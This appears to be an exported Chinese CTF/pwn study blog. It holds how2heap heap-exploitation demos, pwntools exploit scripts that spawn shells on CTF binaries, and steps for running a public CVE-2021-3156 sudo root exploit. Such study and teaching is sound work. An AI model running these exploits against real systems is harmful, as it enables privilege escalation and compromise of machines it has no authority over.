[{"title":"","date":"2021-08-25T01:23:11.628Z","path":"2021/08/25/how2heap/","text":"简记how2heap刷题 first_fit假如我先malloc了一个比较大的堆，然后free掉，当我再申请一个小于刚刚释放的堆的时候，就会申请到刚刚free那个堆的地址。还有就是，我虽然刚刚释放了a指向的堆，但是a指针不会清零，仍然指向那个地址。这里就存在一个uaf（use_after_free)漏洞，原因是free的时候指针没有清零。 自己理解：总共分配了三次，第一次malloc得到的chunk被free掉之后并没有将第一次的指针清空，只是将空间归还。第三次malloc的时候，因为大小比第一次的小，所以将第一次free掉的空间又重新分配了回来，这样当我们输出a和c的时候，都是输出同一个地址的内容。 fastbin_dup123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates a simple double-free attack with fastbins.\\n\"); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\", a, b, a, a); fprintf(stderr, \"1st malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"3rd malloc(8): %p\\n\", malloc(8));} fastbin_dup_into_stack12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file extends on fastbin_dup.c by tricking malloc into\\n\" \"returning a pointer to a controlled location (in this case, the stack).\\n\"); unsigned long long stack_var; fprintf(stderr, \"The address we want malloc() to return is %p.\\n\", 8+(char *)&amp;stack_var); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. \" \"We'll now carry out our attack by modifying data at %p.\\n\", a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", d); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"Now the free list has [ %p ].\\n\", a); fprintf(stderr, \"Now, we have access to %p while it remains at the head of the free list.\\n\" \"so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\" \"so that malloc will think there is a free chunk there and agree to\\n\" \"return a pointer to it.\\n\", a); stack_var = 0x20; fprintf(stderr, \"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, \"3rd malloc(8): %p, putting the stack address on the free list\\n\", malloc(8)); fprintf(stderr, \"4th malloc(8): %p\\n\", malloc(8));} 会发现再次申请的时候就把我们伪造的栈空间当malloc来申请了，这其中的要点为将stack_var = 0x20,然后将stack_var -8 的地址赋值到*d处，也就是fastbin的fd处。再次maollc到指向stack+8的堆。 9447-search-enginehttps://www.freesion.com/article/7775459314/ 结构体： 1234567struct word { word ptr //指向每个word的起始地址 word size //每个word的大小 sentence ptr //指向句子的起始地址 sentence size //每一个句子的大小 pre_word_ptr //指向上一个word struct的指针} 每个sentence都是用链表的方式存起来的，即句子与句子之间是指针连接 上面就是word_ptr 输入word的大小和内容，以输入的大小为size malloc一个堆。 从最后一个word struct开始找起，通过每个struct的pre_word_ptr一直向前找。 然后这里有两个check。第一，当前的word_struct的sentence ptr指向的内容不能为空。第二，当前的word_struct中的size字段要和输入的word的size大小一致，并且通过memcmp(word_struct-&gt;word_ptr, word_ptr, size)来比较输入的word内容和当前struct的word ptr指向的内容是否一致。 通过这两个check之后，分别打印该word struct对应的sentence size和内容。 询问是否删除句子，如果删除的话，就清空该sentence中的内容，并且把该word_struct中的sentence_ptr指针free掉注意这里free之后没有把指针设置为空，存在漏洞，之后可以通过double free来进行一个利用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#coding=utf-8from pwn import *DEBUG = 1io = process(\"./pwn\")libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")if DEBUG: context.log_level = \"debug\" context.terminal = [\"/usr/bin/tmux\", \"splitw\", \"-h\", \"-p\", \"70\"]def index_a_sentence(sentence): io.recvuntil(\"Quit\\n\") io.sendline(\"2\") io.recvuntil(\"size:\") io.sendline(str(len(sentence))) io.recvuntil(\"sentence:\") io.sendline(sentence)def seach_word(word): io.recvuntil(\"Quit\\n\") io.sendline(\"1\") io.recvuntil(\"size:\") io.sendline(str(len(word))) io.recvuntil(\"word:\") io.sendline(word)def leak(): unsorted_bin_sentece = \"s\"*0x85 + \" m\" index_a_sentence(unsorted_bin_sentece) seach_word(\"m\") io.recvuntil(\"(y/n)?\") io.sendline(\"y\") seach_word(\"\\x00\") io.recvuntil(\"Found \" + str(len(unsorted_bin_sentece)) + \": \") main_arena_addr = u64(io.recv(6).ljust(8, \"\\x00\")) - 88 libc_addr = main_arena_addr - 0x3c4b20 io.recvuntil(\"(y/n)?\") io.sendline(\"n\") return libc_addr, main_arena_addrlibc_addr, main_arena_addr = leak()print(\"libc address: \" + hex(libc_addr))index_a_sentence(\"a\"*0x5d + \" d\") #chunk aindex_a_sentence(\"a\"*0x5d + \" d\") #chunk bindex_a_sentence(\"a\"*0x5d + \" d\") #chunk cseach_word(\"d\")io.recvuntil(\"(y/n)?\")io.sendline(\"y\") #free cio.recvuntil(\"(y/n)?\")io.sendline(\"y\") #free bio.recvuntil(\"(y/n)?\")io.sendline(\"y\") #free a# fastbins 0x70: a-&gt;b-&gt;cseach_word(\"\\x00\")io.recvuntil(\"(y/n)?\")io.sendline(\"y\") #free b# fastbins 0x70: b-&gt;a-&gt;b-&gt;....# double free 构建了循环链表io.recvuntil(\"(y/n)?\")io.sendline(\"n\")io.recvuntil(\"(y/n)?\")io.sendline(\"n\")one_gadget_addr = libc_addr + 0xf1147fake_chunk_addr = main_arena_addr - 51payload = p64(fake_chunk_addr).ljust(0x60, \"a\")index_a_sentence(payload) # return chunk b and edit fd# fastbins: a-&gt;b-&gt;fake_chunk notice that fake_chunk size should fall in right fastbins indexindex_a_sentence(\"a\"*0x60) # return chunk aindex_a_sentence(\"a\"*0x60) # return chunk b whose fd has been modifiedpayload = (\"a\"*19 + p64(one_gadget_addr)).ljust(0x60, \"a\")#gdb.attach(io)index_a_sentence(payload)io.interactive() 0ctf 2017-babyheaphttps://uaf.io/assets/0ctfbabyheap 预备知识 利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力。 保护查看如果RELRO: Partial RELRO, 有可能是格式化字符串。 保护全开 函数分析 解析Leak Libc无uaf！！！ 利用double free获得指向small bin的ptr，然后利用dump打印出来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env python# -*- coding: UTF-8 -*-from pwn import *p = process(\"./babyheap\")elf=ELF('./babyheap')libc = ELF('/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')#context.log_level='debug'context.terminal = [\"tmux\",\"splitw\",\"-h\"]context.arch = \"amd64\"def alloc(size): p.recvuntil('Command: ') p.sendline('1') p.sendline(str(size))def fill(idx,payload): p.recvuntil('Command: ') p.sendline('2') p.sendline(str(idx)) p.sendline(str(len(payload))) p.send(payload) def free(idx): p.recvuntil('Command: ') p.sendline('3') p.sendline(str(idx)) def dump(idx): p.recvuntil('Command: ') p.sendline('4') p.sendline(str(idx)) p.recvuntil('Content: \\n') #-------leak main_arena - unsorted bin attack ------alloc(0x10)#idx0 alloc(0x10)#idx1 alloc(0x30)#idx2 alloc(0x40)#idx3 alloc(0x60)#idx4 fill(0,p64(0x51)*4) #idx1 -&gt; size =0x51fill(2,p64(0x31)*6) #让被free的chunk检查到后面是在用的chunkfree(1) alloc(0x40)#idx1 这个指针还是idx1的位置,但是可以读写 idx2 -&gt;fd 了fill(1,p64(0x91)*4) #将idx2放进unsorted bin中free(2)dump(1) p.recv(0x20)SBaddr = u64(p.recv(8))p.recvline()malloc_hook=SBaddr-88-0x10success('malloc_hook = '+hex(malloc_hook))#------------ 把malloc_hook申请出来 ---------------------free(4)payload=p64(0)*9+p64(0x71)+p64(malloc_hook-0x23)fill(3,payload)alloc(0x60)#idx2alloc(0x60)#idx4 malloc_hook#----------- 改 malloc_hook ---------------------------libc_addr = malloc_hook-libc.symbols['__malloc_hook']success('libc = '+hex(libc_addr))payload=p64(libc_addr+0x4526a) #0x4526a在下面解释shllcode='a'*0x13+payloadfill(4,shllcode) alloc(1)p.sendline('bash')p.interactive() 我们需要在 __malloc_hook 写一个函数地址,用来getshell 0x4526a这个偏移里写的是这东西: 1234567&lt;do_system+1098&gt;: mov rax,QWORD PTR [rip+0x37ec47] &lt;do_system+1105&gt;: lea rdi,[rip+0x147adf] &lt;do_system+1112&gt;: lea rsi,[rsp+0x30]&lt;do_system+1117&gt;: mov DWORD PTR [rip+0x381219],0x0 &lt;do_system+1127&gt;: mov DWORD PTR [rip+0x381213],0x0 &lt;do_system+1137&gt;: mov rdx,QWORD PTR [rax]&lt;do_system+1140&gt;: call 0x7f7f36b27770 &lt;execve&gt; fastbin_dup_consolidate 先申请两个chunk，然后free掉p1，之后申请一个较大的chunk，使p1进入unsort bin然后再次free p1，这样再申请两次与p1大小相同的chunk，所申请的chunk的指针就指向同一个位置。 2016 HITCON CTF SleepyHolder 申请大小超过top chunk size, ptmalloc会整合一些fastbin中的free chunk并入top chunk, 如果还不够就mmap一块新的chunk，这个chunk与原有的top chunk之间采用单链表链接. Fastbin对double free的检查机制是仅仅检查fastbin的头chunk是否与当前要释放的这个相同size的chunk地址一样 *malloc_consolidate*****的功能就是把**chunk******从**fastbin******取出，相邻的**chunk******进行合并，并且会设置下一个**chunk******的**prev_inuse******位为**0** 12345add(1, 'aaa') #small secretadd(2, 'bbb') #big secretdelete(1) ------------------add(3, 'ccc') #huge secret ｜--------&gt; Double Freedelete(1) ------------------ 简单点来说就是free了一次chunk1，然后申请了一块很大的chunk，chunk1会被取出来然后合并掉，实际上fastbin中没有chunk，此时再free一次就构成double free了 wiki 程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。 unsafe unlink 关键是在globle chunk当中构造fake_chunk，然后完成上图的构造 house_of_spirit通过free一块不可控内存，在进行一次malloc，使其可控 术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。 要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即 fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。 fake chunk 地址需要对齐， MALLOC_ALIGN_MASK fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。 fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。 fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates the house of spirit attack.\\n\");fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\");malloc(1);fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.\\n\");unsigned long long *a;// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\");fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\");fake_chunks[1] = 0x40; // this is the sizefprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8fake_chunks[9] = 0x1234; // nextsizefprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]);fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\");a = &amp;fake_chunks[2];fprintf(stderr, \"Freeing the overwritten pointer.\\n\");free(a);fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]);fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));} 首先用malloc(1)进行了初始化，然后用一个fake_chunks数组来模拟两个fake_chunk，一个位于0下标的位置，一个位于8下标的位置，1下标是第一个chunk的size，9下标是第二个chunk的size。 因为第一个chunk的大小为64字节，64位系统环境下8字节一个数字，所以从0下标开始，到8下标之前刚好64个字节，那么下一个chunk就正好连在他的后面，所以第二个chunk从8下标位置开始是prev_size,9下标是size，next size的检查要检查下一个chunk的size是否合法，所以9下标size这个值必须是合法的size值，所以给他赋值为合法值。 然后free第一个chunk，通过了检测之后下一次分配相应大小的chunk就会把这个第一个chunk分配出来了","link":"","categories":[],"tags":[]},{"title":"cve_2001_3156","date":"2021-03-13T07:34:44.000Z","path":"2021/03/13/cve-2001-3156/","text":"Linux sudo权限提升漏洞（CVE-2021-3156）复现漏洞详情2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。 影响范围Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 测试系统是否易受此漏洞影响： 以非root用户身份登录系统。 运行命令“sudoedit -s /” 如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。 漏洞复现环境：ubuntu20.04虚拟机，sudo 1.8.31实现： 版本符合要求，通过运行命令“sudoedit -s /”检测是否真正存在漏洞 经检测漏洞存在 注：版本符合要求，漏洞不一定存在，如： Poc地址: https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz 执行进入目录并执行 12345cd CVE-2021-3156make./sudo-hax-me-a-sandwich make并运行文件 查看到可用选项，后提升权限./sudo-hax-me-a-sandwich 1 //结尾的1代表第几个选项","link":"","categories":[],"tags":[{"name":"-CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"}]},{"title":"mark_of_practice","date":"2021-03-13T07:33:44.000Z","path":"2021/03/13/mark-of-practice/","text":"最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。 水题：ret2libc：buu ciscn_2019_en_212345678910111213141516171819202122232425262728293031323334353637383940from pwn import *from LibcSearcher import *context.os='linux' context.arch='amd64' context.log_level='debug' p = remote('node3.buuoj.cn',26863)#p = process('./ciscn_2019_en_2')elf = ELF('./ciscn_2019_en_2')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x400B28#ROPgadget查找ret = 0x00400C84pop_rdi = 0x00400c83 # pop rdi ; retp.sendlineafter('choice!\\n','1')#payload = flat(['\\0', 'a'*0x57, pop_di, puts_got, puts_plt, main_addr])payload = 'a'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter('encrypted\\n',payload)p.recvline()p.recvline()#puts_addr = u64(r.recv(8))puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0'))#puts_addr= u64(r.recvline()[:-1].ljust(8, '\\x00'))#print(puts_addr)#print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libcbase = puts_addr - libc.dump('puts')sys_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')p.sendlineafter('choice!\\n','1')#payload = flat(['\\0', 'a'*0x57, ret, pop_di, binsh_addr, sys_addr])payload = 'a'*0x58+ p64(ret)+ p64(pop_rdi)+ p64(binsh_addr)+ p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() bjdctf_2020_babystack12345678910from pwn import*r=remote('node3.buuoj.cn',26025)shell_addr=0x4006e6r.sendline('100')payload='a'*(0x10+8)+p64(shell_addr)r.sendline(payload)r.interactive() [HarekazeCTF2019]baby_rop12345678910111213from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')#p = process('./babyrop')p = remote('node3.buuoj.cn',26310)#0x00400683 : pop rdi ; retpop_rdi = 0x00400683sys_addr = 0x004005E3bin_sh_addr = 0x00601048payload = 'a'*0x18 + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive() ciscn_2019_n_51234567891011121314151617#coding=utf-8from pwn import *context(os='linux',arch='amd64', log_level = 'debug')#sh = process('./ciscn_2019_n_5')sh = remote('node3.buuoj.cn',25696)elf = ELF('./ciscn_2019_n_5')bss_addr = 0x601080#shellcode =\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"shellcode = asm(shellcraft.sh())#生成64位linuxshellcodepayload = 'a'*0x28 + p64(bss_addr)#栈溢出ret到shellcode执行sh.sendlineafter(\"name\\n\",shellcode)sh.sendlineafter(\"me?\\n\",payload)sh.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"problem_blog","date":"2021-03-13T07:32:22.000Z","path":"2021/03/13/problem-blog/","text":"由于本人博客搭在虚拟机上，而虚拟机又经常出事，很不幸，爷碰上了。。。。。。。。。 起因的的图片没了，大概就是我要更新博客，把md文件放上去之后，本地部署毫无问题，上传到远程的时候出事了，让我确认是否有远程仓库，给爷整蒙了。 刚开始以为是ssh的原因，我重新生成，然后把原来的删掉了，然后添加了新的具体过程如下： 1ssh-keygen -t rsa -C \"youremail@example.com\" 在本地生成 .ssh 文件夹，然后复制其中的id_rsa.pub中的内容放到github中setting上的SSH中 这就添加完毕了，然后验证 1ssh -T git@github.com # github地址 如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 而我的就没有，显示 1Permission denied 很无奈，后来查百度后发现是自己的本机的这个git仓库并没有和这个SSH key 关联上 12ssh-agent bashssh-add \"/home/ubuntu/.ssh/id_rsa\" 回显 1Identity added: /home/ubuntu/.ssh/id_rsa (/home/ubuntu/.ssh/id_rsa) 然后hexo d成功部署","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"problems","slug":"problems","permalink":"http://example.com/tags/problems/"}]},{"title":"第一次讲课","date":"2021-03-13T07:29:16.000Z","path":"2021/03/13/第一次讲课/","text":"pwn知识什么是pwnPwn可以简单概括为软件的漏洞的挖掘和利用（二进制攻防）。 涉及到的知识涉及计算机学科的众多方向，而且大多偏底层。包括不限于，C语言，C++，python，数 据结构，计算机组成原理，操作系统，编译原理，计算机网络等。 linux基础虚拟机：Ubuntu版本不限（但是以后做题的时候会用到不同版本的Ubuntu，具体题目具体分析） 基本命令： ls命令 dir就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。 cd 命令cd(changeDirectory) 命令语法： 1cd [目录名] 说明：切换当前目录至 dirName。 mkdir filename创建文件夹。 python安装1sudo apt-get install python 安装。（只能安装库中有的软件程序） 123sudo apt-get updatesudo apt-get upgrade 安装 git，gdb 12sudo apt-get install git sudo apt-get install gdb pip安装 1sudo apt-get install python3-pip 安装pwntools 1pip3 install pwntools PWN类型栈漏洞，堆漏洞，格式化字符串漏洞，整型漏洞，逻辑漏洞 buuctf 第二排第三个 level0 pwn练习ROP Emporiumret2win测偏移cyclic 0x32 cyclic(0x32).find(‘kaaalaaam’) 找到system函数地址 exp1234567891011121314from pwn import *context.log_level='debug'p = process('./ret2win')p = remote('',***)system_addr = 0x0400824payload = 'a'*40+p64(system_addr) #0x20+8p.sendline(payload)p.interactive() splitx64传参方式：当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 需要bin/sh或者cat flag 测偏移，详情见上题 使用ROPgadget 1ROPgadget --binary ./split --only'pop|ret' exp1234567891011121314from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883payload = 'A'*40+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive() callmeIDA 启动！字符串分析 IDA_字符串检查 libcallme.so : 之前文件夹里面的libcallme库 callme one/two/three : 可能为libcallme中的函数 usefulFuction 这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数 libcallme.so libcallme 果然，三个函数在这里 函数分析1.callme_one callme_one 发现它的作用是读取已经加密了的flag.txt 2.callme_two callme_two 发现是利用key1.dat进行一些解密工作 3.callme_three callme_three 和callme_two差不多，也是进行解密工作 分析漏洞点函数 pwnme 是pwnme函数的一个fgets溢出漏洞 同样得到偏移值0x20+8 查看plt表 plt表 得到地址 123callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810 思路 使用ROP实现跳转 使用plt表调用函数关于plt表：GOT表和PLT表知识详解 PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址 其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。 exp12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'#context.terminnal = ['gnome-terminal','-e']p = process('./callme')elf = ELF('./callme')#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; retpppad = 0x00401ab0callme_three = elf.plt['callme_three']callme_two = elf.plt['callme_two']callme_one = elf.plt['callme_one']#gdb.attach(p)payload = 'a' * 40payload += p64(pppad+3)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_one)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_two)payload += p64(pppad) +p64(1) +p64(2) + p64(3) + p64(callme_three)p.recvuntil('&gt;')p.sendline(payload)p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"Hello World","date":"2021-03-13T05:53:10.160Z","path":"2021/03/13/hello-world/","text":"第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。 Startnew world1print('Hello World!')","link":"","categories":[],"tags":[]},{"title":"ROPempire","date":"2020-10-01T17:25:52.000Z","path":"2020/10/02/ROPempire/","text":"##ret2win 12345678910111213from pwn import *p = process('./ret2win')system_addr = 0x0400824pad = 'a'*0x20+'deadbeef'payload = pad+p64(system_addr)p.sendline(payload)p.interactive() ##split考察将字符串通过寄存器存到函数当中，要熟练掌握x86与x64的传参规律. 1234567891011121314from pwn import *p = process('./split')#elf = ELF('./split')system_addr = 0x00400810#system_addr = elf.symbols['system']cat_flag_addr = 0x00601060pop_rdi_ret = 0x00400883pad = 'A'*40payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)p.sendline(payload)p.interactive() ##callme对参数传递的考察 123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'p = process('./callme')elf = ELF('./callme')# info# gadgetpppr = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; retcallme_three = 0x401810callme_two = 0x401870callme_one = 0x401850# rop1offset = 40payload = '\\0'*offsetpayload += p64(pppr+3)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) # debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive() ##write4考察通过将字符串写入.bss段来将字符串传递给system函数然后getshell，同时考察gadget的选取与对段的理解。 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'p = process('./write4')sys_addr = 0x00400810bss_addr = 0x601060mov_r14_r15 = 0x400820pop_r14_r15 = 0x400890pop_rdi = 0x400893payload = 'a'*(0x20+8)payload += p64(pop_r14_r15) #清空寄存器payload += p64(bss_addr) #向r14中写入bss段地址payload += \"/bin/sh\".ljust(8,\"\\x00\") #向r15中写入/bin/sh\\x00payload += p64(mov_r14_r15) #将r15中的字符串写入r14payload += p64(pop_rdi) #清空rdipayload += p64(bss_addr) #向rdi中写入bss中的字符串payload += p64(sys_addr) #rdi向system传参p.recvuntil('&gt;')p.sendline(payload)p.recv()p.interactive() ##badchars 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p = process('./badchars')elf = ELF('./badchars')context.log_level = 'debug'# gadgetprdi = 0x400b39 p1213 = 0x400b3bm1213 = 0x400b34system = 0x04009E8#system = elf.plt['system']p1415 = 0x400b40x1415 = 0x400b30''' 0x400b30 &lt;usefulGadgets&gt;: xor BYTE PTR [r15],r14b 0x400b33 &lt;usefulGadgets+3&gt;: ret 0x400b34 &lt;usefulGadgets+4&gt;: mov QWORD PTR [r13+0x0],r12 0x400b38 &lt;usefulGadgets+8&gt;: ret 0x400b39 &lt;usefulGadgets+9&gt;: pop rdi=&gt; 0x400b3a &lt;usefulGadgets+10&gt;: ret 0x400b3b &lt;usefulGadgets+11&gt;: pop r12 0x400b3d &lt;usefulGadgets+13&gt;: pop r13 0x400b3f &lt;usefulGadgets+15&gt;: ret 0x400b40 &lt;usefulGadgets+16&gt;: pop r14 0x400b42 &lt;usefulGadgets+18&gt;: pop r15 0x400b44 &lt;usefulGadgets+20&gt;: ret '''# rop1offset = 40payload = 'A'*offset# filtered: bic/ fns# $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) payload += p64(p1213) + '$0\\0\\0\\0\\0\\0\\0' + p64(elf.bss()+0x400) + p64(m1213) payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system)# debug()p.recvuntil('&gt;')p.sendline(payload)p.interactive()","link":"","categories":[{"name":"从0开始","slug":"从0开始","permalink":"http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]}]